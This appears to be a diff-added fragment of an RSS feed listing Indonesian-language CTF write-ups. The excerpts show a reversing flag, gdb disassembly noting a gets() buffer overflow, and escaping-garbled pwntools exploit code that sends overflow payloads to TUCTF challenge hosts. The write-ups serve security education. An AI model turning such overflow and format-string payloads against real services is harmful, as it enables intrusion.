+    
+    <item>
+      <title>SharifCTF 2016 - UnloadMe</title>
+      <link>rhamaa.github.io/post/2016-12-22-suctf2016-unloadme/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2016-12-22-suctf2016-unloadme/</guid>
+      <description>content {:toc}  Challenge RE SharifCTF 2016 UnloadMe berupa file PE32 Windows Executable
+root@kali:~/Desktop/SU CTF/RE# file UnloadMe UnloadMe: PE32 executable (native) Intel 80386, for MS Windows Proof Of Concept Saya melakukan disassembly menggunakan Hopper, ditemukan Hex String mencurigakan pada register.
+Apabila Hex String tersebut didecode akan menghasilkan cc043056a0a32cb5e104aeb2cf4ff7ba flag : SharifCTF{cc043056a0a32cb5e104aeb2cf4ff7ba}</description>
+    </item>
+    
+    <item>
+      <title>TAMUCTF 2018 - Pwning</title>
+      <link>rhamaa.github.io/post/2018-02-27-tamuctf-2018-pwning/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2018-02-27-tamuctf-2018-pwning/</guid>
+      <description>Pwn1 Diberikan sebuah file binary dengan informasi sebagai berikut
+Percobaan debugging menggunakan gdb
+$ gdb -q pwn1 Reading symbols from pwn1...(no debugging symbols found)...done. gdb-peda $ pdisass main Berikut hasil disassable fungsi main
+0x080485cf &amp;lt;+29&amp;gt;: call 0x8048410 &amp;lt;setvbuf@plt&amp;gt; 0x080485d4 &amp;lt;+34&amp;gt;: add esp,0x10 0x080485d7 &amp;lt;+37&amp;gt;: sub esp,0xc 0x080485da &amp;lt;+40&amp;gt;: push 0x8048700 0x080485df &amp;lt;+45&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x080485e4 &amp;lt;+50&amp;gt;: add esp,0x10 0x080485e7 &amp;lt;+53&amp;gt;: sub esp,0xc 0x080485ea &amp;lt;+56&amp;gt;: push 0x8048720 0x080485ef &amp;lt;+61&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x080485f4 &amp;lt;+66&amp;gt;: add esp,0x10 0x080485f7 &amp;lt;+69&amp;gt;: sub esp,0xc 0x080485fa &amp;lt;+72&amp;gt;: push 0x804875f 0x080485ff &amp;lt;+77&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x08048604 &amp;lt;+82&amp;gt;: add esp,0x10 0x08048607 &amp;lt;+85&amp;gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804860e &amp;lt;+92&amp;gt;: sub esp,0xc 0x08048611 &amp;lt;+95&amp;gt;: lea eax,[ebp-0x23] 0x08048614 &amp;lt;+98&amp;gt;: push eax 0x08048615 &amp;lt;+99&amp;gt;: call 0x80483d0 &amp;lt;gets@plt&amp;gt; 0x0804861a &amp;lt;+104&amp;gt;: add esp,0x10 0x0804861d &amp;lt;+107&amp;gt;: cmp DWORD PTR [ebp-0xc],0xf007ba11 0x08048624 &amp;lt;+114&amp;gt;: jne 0x804862d &amp;lt;main+123&amp;gt; 0x08048626 &amp;lt;+116&amp;gt;: call 0x804854b &amp;lt;print_flag&amp;gt; 0x0804862b &amp;lt;+121&amp;gt;: jmp 0x804863d &amp;lt;main+139&amp;gt; 0x0804862d &amp;lt;+123&amp;gt;: sub esp,0xc 0x08048630 &amp;lt;+126&amp;gt;: push 0x8048772 0x08048635 &amp;lt;+131&amp;gt;: call 0x80483f0 &amp;lt;puts@plt&amp;gt; 0x0804863a &amp;lt;+136&amp;gt;: add esp,0x10 0x0804863d &amp;lt;+139&amp;gt;: mov eax,0x0 0x08048642 &amp;lt;+144&amp;gt;: mov ecx,DWORD PTR [ebp-0x4] 0x08048645 &amp;lt;+147&amp;gt;: leave 0x08048646 &amp;lt;+148&amp;gt;: lea esp,[ecx-0x4] 0x08048649 &amp;lt;+151&amp;gt;: ret Terlihat terdapat penggunaan fungsi gets() yang vulnerable buffer overflow.</description>
+    </item>
+    
+    <item>
+      <title>TPCTF 2017 - Write up</title>
+      <link>rhamaa.github.io/post/2017-12-05-tpctf-2017-write-up/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-12-05-tpctf-2017-write-up/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>TUCTF 2017 - Write up</title>
+      <link>rhamaa.github.io/post/2017-12-1-tuctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-12-1-tuctf-2017/</guid>
+      <description>gdb.execute(&amp;quot;b *0x0000000000401c82&amp;quot;)whileTrue:forcinchar_set:pattern=flag+c+&amp;quot;A&amp;quot;*(55-len(flag))gdb.execute(&amp;quot;r {}&amp;ldquo;.format(pattern))foriinrange(len(flag)):gdb.execute(&amp;quot;c&amp;quot;)rax=gdb.execute(&amp;quot;p/x $rax&amp;quot;,True,True).split()[-1]ifrax==&amp;quot;0x0&amp;quot;:flag+=cif&amp;rdquo;}&amp;ldquo;inflag:print(&amp;quot;Flag : %s&amp;quot;%(flag))exit(0)print(&amp;quot;Curret Flag : %s&amp;quot;%(flag))sleep(1)breakprint(&amp;quot;Pattern : %s&amp;quot;%(pattern))print(&amp;quot;Nilai Rax : %s&amp;quot;%(rax))vuln=remote(&amp;quot;vulnchat.tuCTF.com&amp;quot;,4141)payload=&amp;quot;A&amp;quot;20+p32(0x00007325)# overwrite with &amp;ldquo;%s&amp;quot;vuln.sendlineafter(&amp;quot;Enter your username: &amp;ldquo;,payload)payload2=&amp;quot;A&amp;quot;49+p32(0x804856b)vuln.sendlineafter(&amp;rdquo;: &amp;ldquo;,payload2)printvuln.recvall()flag=&amp;quot;\x72&amp;quot;vuln2=remote(&amp;quot;vulnchat2.tuCTF.com&amp;quot;,4242)vuln2.sendlineafter(&amp;quot;Enter your username: &amp;ldquo;,&amp;quot;AAAA&amp;quot;)vuln2.recvuntil(&amp;quot;AAAA: &amp;ldquo;)payload=&amp;quot;A&amp;quot;*43+flagvuln2.send(payload)printvuln2.recv(1024)never=remote(&amp;quot;neverending.tuCTF.com&amp;quot;,12345)char_set=&amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&amp;quot;#$%&amp;amp;&#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~&amp;lt;/span&amp;gt;s&amp;quot;defround1(char=&amp;quot;A&amp;quot;):never.sendlineafter(&amp;quot;text:&amp;ldquo;,char)enc_base=never.recvline().split(&amp;quot;is &amp;ldquo;)[1]enc_msg=never.recvline().split(&amp;quot;is &amp;ldquo;)[1]enc_msg=enc_msg.split(&amp;rdquo; decrypted?\n&amp;quot;)[0]log.info(&amp;quot;ENC BASE : -&amp;gt; {}&amp;ldquo;.format(enc_base))log.info(&amp;quot;ENC MSG : -&amp;gt; {}&amp;ldquo;.format(enc_msg))cal=ord(char)-ord(enc_base[0])dec=&amp;quot;&amp;ldquo;.join([chr(ord(b)+cal)forbinenc_msg])&amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;non_printable&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;o&amp;quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;[&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;nb&amp;quot;&amp;gt;chr&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;nb&amp;quot;&amp;gt;ord&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;z&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;))&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;k&amp;quot;&amp;gt;for&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;z&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;ow&amp;quot;&amp;gt;in&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;dec&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;k&amp;quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;z&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;ow&amp;quot;&amp;gt;not&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;ow&amp;quot;&amp;gt;in&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;char_set&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;]&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;printable&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;o&amp;quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;s&amp;quot;&amp;gt;&amp;quot;&amp;quot;&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;o&amp;quot;&amp;gt;.</description>
+    </item>
+    
+    <item>
+      <title>TUCTF 2017 - Writeup</title>
+      <link>rhamaa.github.io/post/2017-11-27-tuctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-27-tuctf-2017/</guid>
+      <description>Reversing 200 (Unknown) Diberikan file ELF 64 bit stripped.
+Berikut hasil disassembly fungsi main
+signed __int64 __fastcall main(int a1, char **a2, char **a3) { signed __int64 result; // rax@2  unsigned int i; // [sp+14h] [bp-Ch]@5  char *v5; // [sp+18h] [bp-8h]@5  if ( a1 == 2 ) { if ( strlen(a2[1]) == 56 ) { v5 = a2[1]; for ( i = 0; i &amp;lt; 0x38; ++i ) { if ( (unsigned int)sub_401E90((__int64)v5, i) ) dword_603084 = 1; } if ( dword_603084 ) puts(&amp;#34;Nope.</description>
+    </item>
+    
+    <item>
+      <title>Write Up Cyber Jawara 2017</title>
+      <link>rhamaa.github.io/post/2017-11-06-cyber-jawara-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-06-cyber-jawara-2017/</guid>
+      <description>Berikut adalah write up penyisihan Cyber Jawara 2017 dari tim Rules Of Pwning (ROP).
+Write Up Cyber Jawara 2017 </description>
+    </item>
+    
+  </channel>
+</rss>
